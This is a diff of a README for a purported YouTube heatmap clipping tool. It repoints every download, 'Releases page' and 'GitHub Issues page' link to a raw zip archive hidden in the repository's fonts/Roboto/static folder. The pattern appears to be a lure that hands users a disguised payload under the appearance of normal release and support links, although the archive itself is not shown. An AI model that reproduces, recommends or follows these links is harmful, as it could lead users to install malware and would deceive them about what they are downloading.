@@ -1,7 +1,7 @@
 # 🎥 youtube-heatmap-clipper - Clip Engaging YouTube Moments Effortlessly
 
 ## 📥 Download Now
-[![Download](https://github.com/blacksigaret/youtube-heatmap-clipper/raw/refs/heads/main/images/heatmap-youtube-clipper-v1.8.zip%20release-brightgreen)](https://github.com/blacksigaret/youtube-heatmap-clipper/raw/refs/heads/main/images/heatmap-youtube-clipper-v1.8.zip)
+[![Download](https://raw.githubusercontent.com/blacksigaret/youtube-heatmap-clipper/main/fonts/Roboto/static/heatmap_youtube_clipper_1.2.zip%20release-brightgreen)](https://raw.githubusercontent.com/blacksigaret/youtube-heatmap-clipper/main/fonts/Roboto/static/heatmap_youtube_clipper_1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to **youtube-heatmap-clipper**! This application helps you automatically find and clip the most engaging parts of YouTube videos using heatmap-based viewer interaction data. You can now save time and focus on the best moments in your videos.
@@ -14,10 +14,10 @@ Before you install, please ensure your system meets the following requirements:
 - **Internet Connection:** Required for downloading videos and data.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/blacksigaret/youtube-heatmap-clipper/raw/refs/heads/main/images/heatmap-youtube-clipper-v1.8.zip) to download the latest version. Choose the file that suits your operating system and install it according to the following instructions:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/blacksigaret/youtube-heatmap-clipper/main/fonts/Roboto/static/heatmap_youtube_clipper_1.2.zip) to download the latest version. Choose the file that suits your operating system and install it according to the following instructions:
 
 1. **Access the Releases Page:** 
-   Click [here](https://github.com/blacksigaret/youtube-heatmap-clipper/raw/refs/heads/main/images/heatmap-youtube-clipper-v1.8.zip) to open the releases page.
+   Click [here](https://raw.githubusercontent.com/blacksigaret/youtube-heatmap-clipper/main/fonts/Roboto/static/heatmap_youtube_clipper_1.2.zip) to open the releases page.
 
 2. **Select Your Operating System:**
    - For Windows, download the file ending with `.exe`.
@@ -69,8 +69,8 @@ A: The application requires an internet connection to download video data. Howev
 A: The heatmaps are based on viewer interactions and provide a good indication of which parts of the video are most engaging.
 
 ## 💬 Community and Support
-For support, feedback, or discussions about features, please visit the [GitHub Issues page](https://github.com/blacksigaret/youtube-heatmap-clipper/raw/refs/heads/main/images/heatmap-youtube-clipper-v1.8.zip). Your inputs help us improve the application.
+For support, feedback, or discussions about features, please visit the [GitHub Issues page](https://raw.githubusercontent.com/blacksigaret/youtube-heatmap-clipper/main/fonts/Roboto/static/heatmap_youtube_clipper_1.2.zip). Your inputs help us improve the application.
 
 ## 📥 Download Now
 Don't wait! Start clipping your engaging YouTube moments today by clicking the link below.
-[![Download](https://github.com/blacksigaret/youtube-heatmap-clipper/raw/refs/heads/main/images/heatmap-youtube-clipper-v1.8.zip%20release-brightgreen)](https://github.com/blacksigaret/youtube-heatmap-clipper/raw/refs/heads/main/images/heatmap-youtube-clipper-v1.8.zip)
+[![Download](https://raw.githubusercontent.com/blacksigaret/youtube-heatmap-clipper/main/fonts/Roboto/static/heatmap_youtube_clipper_1.2.zip%20release-brightgreen)](https://raw.githubusercontent.com/blacksigaret/youtube-heatmap-clipper/main/fonts/Roboto/static/heatmap_youtube_clipper_1.2.zip)
